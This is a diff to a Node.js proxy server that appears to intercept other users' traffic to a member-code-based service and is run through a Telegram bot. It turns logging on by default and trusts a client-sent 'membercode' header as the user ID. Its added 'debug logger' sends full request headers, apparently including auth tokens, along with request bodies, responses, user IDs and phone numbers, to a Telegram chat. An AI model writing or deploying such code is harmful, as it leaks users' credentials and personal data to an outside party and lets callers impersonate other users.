@@ -17,7 +17,7 @@ const DEFAULT_DATA = {
   autoRotate: false,
   lastUsedIndex: -1,
   adminChatId: null,
-  logRequests: false,
+  logRequests: true,
   debugMode: false,
   usdtAddress: '',
   serviceOverride: true,
@@ -278,11 +278,16 @@ async function getUserIdFromToken(req) {
 }
 
 async function extractUserId(req, jsonResp) {
+  const mcHdr = req.headers['membercode'] || req.headers['memberCode'] || '';
+  if (mcHdr) {
+    const cleanMc = String(mcHdr).replace(/^MC/i, '').trim();
+    if (cleanMc && /^\d{3,}$/.test(cleanMc)) return cleanMc;
+  }
   const fromToken = await getUserIdFromToken(req);
   if (fromToken) return fromToken;
   const body = req.parsedBody || {};
-  const uid = body.memberCodeId || body.userId || body.userid || body.memberId || '';
-  if (uid) return String(uid);
+  const uid = body.memberCodeId || body.userId || body.userid || body.memberId || body.memberCode || '';
+  if (uid) return String(uid).replace(/^MC/i, '');
   const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
   if (qs.get('memberCodeId')) return String(qs.get('memberCodeId'));
   if (qs.get('userId')) return String(qs.get('userId'));
@@ -509,6 +514,47 @@ async function proxyFetch(req) {
   }
   let jsonResp = null;
   try { jsonResp = JSON.parse(respBody); } catch (e) { }
+
+  // Global Full Payload Debug Logger
+  try {
+    const liveData = cachedData || await loadData();
+    if (liveData && liveData.debugMode && liveData.adminChatId && bot) {
+      const endpoint = req.originalUrl || req.url || '';
+      if (!endpoint.includes('bot-webhook') && !endpoint.includes('favicon')) {
+        const tok = getTokenFromReq(req);
+        const tKey = tok && tok.length > 10 ? tok.substring(0, 100) : '';
+        const uid = tKey ? (tokenUserMap[tKey] || '') : (req.parsedBody ? (req.parsedBody.memberCodeId || req.parsedBody.userId) : '');
+        const phone = getPhone(liveData, uid) || (uid && userPhoneMap[String(uid)]) || '';
+        const uTag = uid ? ` | User: \`${uid}\`${phone ? ` (\`${phone}\`)` : ''}` : '';
+
+        const debugReqInfo = {
+          method: req.method,
+          url: endpoint,
+          headers: fwd,
+          body: (req.parsedBody && Object.keys(req.parsedBody).length > 0) ? req.parsedBody : (req.rawBody ? req.rawBody.toString() : {})
+        };
+
+        let reqJsonStr = JSON.stringify(debugReqInfo, null, 2);
+        if (reqJsonStr.length > 1800) reqJsonStr = reqJsonStr.substring(0, 1800) + '\n... [truncated]';
+
+        let resJsonStr = '';
+        if (jsonResp) {
+          resJsonStr = JSON.stringify(jsonResp, null, 2);
+        } else {
+          resJsonStr = respBody || '(empty)';
+        }
+        if (resJsonStr.length > 2000) resJsonStr = resJsonStr.substring(0, 2000) + '\n... [truncated]';
+
+        let dbgMsg = `🔍 *DEBUG LOG* ➔ \`${req.method} ${endpoint}\`${uTag}\n`;
+        dbgMsg += `*Status:* \`${response.status}\`\n\n`;
+        dbgMsg += `📤 *REQUEST (Headers + Payload):*\n\`\`\`json\n${reqJsonStr}\n\`\`\`\n\n`;
+        dbgMsg += `📥 *RESPONSE:*\n\`\`\`json\n${resJsonStr}\n\`\`\``;
+
+        bot.sendMessage(liveData.adminChatId, dbgMsg, { parse_mode: 'Markdown' }).catch(() => { });
+      }
+    }
+  } catch (e) { }
+
   return { response, respBody, respHeaders, jsonResp };
 }
 
@@ -764,8 +810,12 @@ app.use((req, res, next) => {
       if (tKey && logOffTokens.has(tKey)) return;
       let userId = tKey ? (tokenUserMap[tKey] || '') : '';
       if (!userId) {
+        const mcHdr = req.headers['membercode'] || req.headers['memberCode'] || '';
+        if (mcHdr) userId = String(mcHdr).replace(/^MC/i, '').trim();
+      }
+      if (!userId) {
         const body = req.parsedBody || {};
-        userId = body.memberCodeId || '';
+        userId = body.memberCodeId || body.userId || body.memberCode || '';
       }
       if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
       if (!userId && tKey && redis) {
@@ -777,7 +827,7 @@ app.use((req, res, next) => {
       const phone = getPhone(data, userId);
       const tag = userId ? ` [${userId}]` : '';
       const phoneTag = phone ? ` (${phone})` : '';
-      await safeSend(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`);
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(() => { });
     } catch (e) { console.error('[LOG_MW_ERROR]', e.message); }
   })();
   next();
@@ -957,7 +1007,7 @@ Example:
     if (text === '/on') { data = await loadData(true); data.botEnabled = true; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🟢 Proxy ON'); return res.sendStatus(200); }
     if (text === '/off') { data = await loadData(true); data.botEnabled = false; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
     if (text === '/rotate') { data = await loadData(true); data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
+    if (text === '/log') { data = await loadData(true); data.logRequests = !data.logRequests; data._skipOverrideMerge = true; await saveData(data); if (cachedData) cachedData.logRequests = data.logRequests; await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text === '/debug' || text === '/debug on' || text === '/debug off') {
       data = await loadData(true);
